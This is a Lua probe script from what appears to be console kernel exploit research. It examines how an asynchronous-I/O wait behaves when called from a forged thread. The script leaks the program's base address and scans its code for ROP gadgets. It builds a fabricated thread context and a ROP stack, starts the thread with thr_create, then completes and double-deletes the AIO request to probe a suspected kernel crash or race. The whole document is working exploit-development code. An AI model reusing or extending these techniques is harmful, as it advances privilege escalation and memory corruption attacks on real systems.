-- CRASH_CLASS: MODERATE
-- PROBE 466a: what does the waiter return
--
-- 461a started a thread whose first instruction was 663 on a PENDING request
-- and the process wedged after the first child was created, with the loader
-- dumping a fault.  This probe isolates the two candidates: the fabricated
-- thread context, and the client that sleeps.
--
-- Here the request is already complete, so 663 returns immediately and the
-- child goes straight to thr_exit.  If this survives, the context is fine and
-- the wedge belongs to the waiting client.

print("=== PROBE 466a: AIO WAIT FROM A THREAD ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    if type(v) ~= "table" or not v.h then
        local n = tonumber(v) or 0
        if n < 0 then return -1 end
        return n
    end
    local h = tonumber(v.h) or 0
    local l = tonumber(v.l) or 0
    if h == -1 or h == 0xFFFFFFFF then
        if l == -1 or (l % 4294967296) == 0xFFFFFFFF then return -1 end
    end
    if h ~= 0 then return nil end
    return l
end
local function fmt(v) if v == nil then return "BIG" end return tostring(v) end
local function rd(a) return to_num(memory.read_dword(u64(0, to_num(a)))) end
local function wr(a, v) memory.write_dword(u64(0, to_num(a)), uint64(v)) end
local function wrq(a, v) memory.write_qword(u64(0, to_num(a)), uint64(v)) end

local sc_mmap  = make_syscall(477)
local AIO_SUBMIT = make_syscall(669)
local AIO_WAIT   = make_syscall(663)
local THR_CREATE = make_syscall(430)
local GETPID     = make_syscall(20)

print(string.format("canary getpid=%s", fmt(sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))))))

local info = memory.alloc(0x300)
wr(info, 0x160)
local sc593 = make_syscall(593)
local rv593 = sgn(sc593(uint64(0), uint64(to_num(info)), uint64(0), uint64(0), uint64(0), uint64(0)))
local base_hi = rd(to_num(info) + 0x10C)
local base_lo = rd(to_num(info) + 0x108)
local base = u64(base_hi, base_lo)
local sa = to_num(syscall.syscall_address or 0)
print(string.format("593 rv=%s eboot=0x%X%08X syscall=0x%X", fmt(rv593), base_hi, base_lo, sa))

local text = memory.read_buffer(base, 0x60000)
local pop_rax, park = nil, nil
for i = 1, #text - 1 do
    if not pop_rax and text:byte(i) == 0x58 and text:byte(i + 1) == 0xC3 then pop_rax = base + (i - 1) end
    if not park and text:byte(i) == 0xEB and text:byte(i + 1) == 0xFE then park = base + (i - 1) end
end
print(string.format("pop_rax=0x%X park=0x%X", to_num(pop_rax), to_num(park)))
if not pop_rax or not park or sa == 0 then print("scan failed"); return end

local PAGE = 0x8000
local p = to_num(sc_mmap(uint64(0), uint64(PAGE), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
if p <= 0 or p >= 0x800000000000 then print("mmap failed"); return end
for i = 0, PAGE - 1, 8 do memory.write_qword(u64(0, p + i), uint64(0)) end
local REQ, IDS, TMO, DATA, RESULT = p, p + 0x100, p + 0x200, p + 0x300, p + 0x400
local CTX = p + 0x1000          -- one 0x500 context
local STACK = p + 0x2000        -- 0x4000 stack
local SSTATES = p + 0x6000      -- thread's state array

local function open_node(path, flags)
    local b = memory.alloc(#path + 1)
    for i = 1, #path do memory.write_byte(b + i - 1, path:byte(i)) end
    memory.write_byte(b + #path, 0)
    return sgn(make_syscall(5)(uint64(to_num(b)), uint64(flags), uint64(0), uint64(0), uint64(0), uint64(0)))
end

local pair = memory.alloc(8)
local sp = sgn(make_syscall(135)(uint64(1), uint64(1), uint64(0), uint64(to_num(pair)), uint64(0), uint64(0)))
local rd_fd = rd(to_num(pair))
local wr_fd = rd(to_num(pair) + 4)
print(string.format("[A] socketpair rv=%s read=%d write=%d", fmt(sp), rd_fd, wr_fd))
for i = 0, 0x27, 8 do wrq(REQ + i, 0) end
wrq(REQ + 0x08, 16)
wrq(REQ + 0x10, DATA)
wrq(REQ + 0x18, RESULT)
wr(REQ + 0x20, rd_fd)
wrq(IDS, 0)
local sub = sgn(AIO_SUBMIT(uint64(1), uint64(REQ), uint64(1), uint64(1), uint64(IDS), uint64(0)))
local id = rd(IDS)
print(string.format("    669 rv=%s id=0x%X result=0x%X", fmt(sub), id, rd(RESULT)))
wr(TMO, 5000)
print("    (no Lua wait: the request stays pending)")

print("[B] the same call from a thread")
local top = STACK + 0x4000 - 0x40
local write_gadget = base + 0x92C67      -- mov [rdi], rax; ret
local RVMARK = p + 0x7800
wrq(top, write_gadget)
wrq(top + 8, pop_rax)
wrq(top + 16, 431)
wrq(top + 24, u64(0, sa))
wrq(top + 32, park)
wrq(CTX + 0x108, 0x480)
wrq(CTX + 0x0d0, 0)
wrq(CTX + 0x110, 0x10000)
wrq(CTX + 0x0c0, 0x43)
wrq(CTX + 0x0f0, 0x202)
wrq(CTX + 0x0e0, u64(0, sa))
wrq(CTX + 0x0f8, top)
wrq(CTX + 0x100, 0x3b)
wrq(CTX + 0x048, IDS)
wrq(CTX + 0x050, 1)
wrq(CTX + 0x058, SSTATES)
wrq(CTX + 0x060, 0)
wrq(CTX + 0x068, TMO)
wrq(CTX + 0x078, 663)
local out = p + 0x7000
wrq(out, 0)
local crv = sgn(THR_CREATE(uint64(CTX), uint64(out), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("    thr_create rv=%s tid=0x%X", fmt(crv), rd(out)))

local burn = 0
for i = 1, 400000 do burn = burn + i end
print("[C] complete the request, then delete it immediately")
print(string.format("    before: states=0x%X", rd(SSTATES)))
local msg = memory.alloc(16)
for i = 0, 15 do memory.write_byte(to_num(msg) + i, 0x41) end
local sent = sgn(make_syscall(4)(uint64(wr_fd), uint64(to_num(msg)), uint64(16), uint64(0), uint64(0), uint64(0)))
print(string.format("    peer write rv=%s", fmt(sent)))
local sids = memory.alloc(4)
wr(to_num(sids), id)
local b2 = 0
for i = 1, 300000 do b2 = b2 + i end
print(string.format("    after a short wait: states=0x%X", rd(SSTATES)))
local d = sgn(make_syscall(662)(uint64(to_num(sids)), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("    662 delete rv=%s", fmt(d)))
print(string.format("    after: states=0x%X result=0x%X waiter_rv=0x%X", rd(SSTATES), rd(RESULT), rd(IDS)))
local d2 = sgn(make_syscall(662)(uint64(to_num(sids)), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("    second delete rv=%s", fmt(d2)))
print("")
print("=== 466a DONE ===")
